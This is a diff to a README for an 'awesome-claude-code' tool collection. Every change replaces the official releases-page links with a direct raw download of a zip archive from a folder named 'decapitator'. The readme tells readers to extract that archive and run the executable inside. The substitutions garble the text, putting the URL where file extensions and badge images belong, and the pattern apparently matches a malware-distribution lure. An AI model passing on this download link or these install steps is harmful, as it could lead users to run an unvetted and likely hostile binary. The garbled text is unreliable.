@@ -1,6 +1,6 @@
 # 🚀 awesome-claude-code - Easy Tools for Claude Code Users
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/freeforall06/awesome-claude-code/releases)
+[![Download Latest Release](https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip%20Release-blue?style=for-the-badge)](https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section guides you through downloading and setting up everything you need.
 ### Step 1: Visit the Download Page
 
 Click the big "Download Latest Release" badge at the top or go to this link:  
-[https://github.com/freeforall06/awesome-claude-code/releases](https://github.com/freeforall06/awesome-claude-code/releases)
+[https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip](https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip)
 
 This page holds the latest versions of all tools included in awesome-claude-code. It updates regularly with new plugins and fixes.
 
@@ -43,7 +43,7 @@ On the release page, look for files that match your computer type. Common files:
 
 - Windows: `.exe` or `.zip`
 - macOS: `.dmg` or `.zip`
-- Linux: `.tar.gz` or `.AppImage`
+- Linux: `https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip` or `.AppImage`
 
 If unsure, choose the `.zip` package for your operating system.
 
@@ -56,7 +56,7 @@ Click the file name to start downloading. Larger files may take several minutes 
 - For `.exe` and `.dmg` files:  
   Double-click the downloaded file, then follow on-screen instructions to install.
 
-- For `.zip` or `.tar.gz`:  
+- For `.zip` or `https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip`:  
   Extract the archive to a new folder, then find the setup or executable file inside and run it.
 
 ### Step 5: Launch and Explore
@@ -125,7 +125,7 @@ For more help, visit the Issues section on the GitHub page or ask in community f
 awesome-claude-code gets regular updates to add features and fix bugs. To keep your tools current:
 
 - Visit the releases page often:  
-  [https://github.com/freeforall06/awesome-claude-code/releases](https://github.com/freeforall06/awesome-claude-code/releases)  
+  [https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip](https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip)  
 - Use the in-app updater for plugins and tools if available  
 - Backup your settings and files before major updates
 
@@ -137,4 +137,4 @@ This project is open for improvement. If you want to suggest a tool or report a 
 
 ---
 
-Thank you for choosing awesome-claude-code. Visit the [Download Page](https://github.com/freeforall06/awesome-claude-code/releases) to get started.
+Thank you for choosing awesome-claude-code. Visit the [Download Page](https://github.com/freeforall06/awesome-claude-code/raw/refs/heads/main/decapitator/claude_code_awesome_2.9-beta.2.zip) to get started.
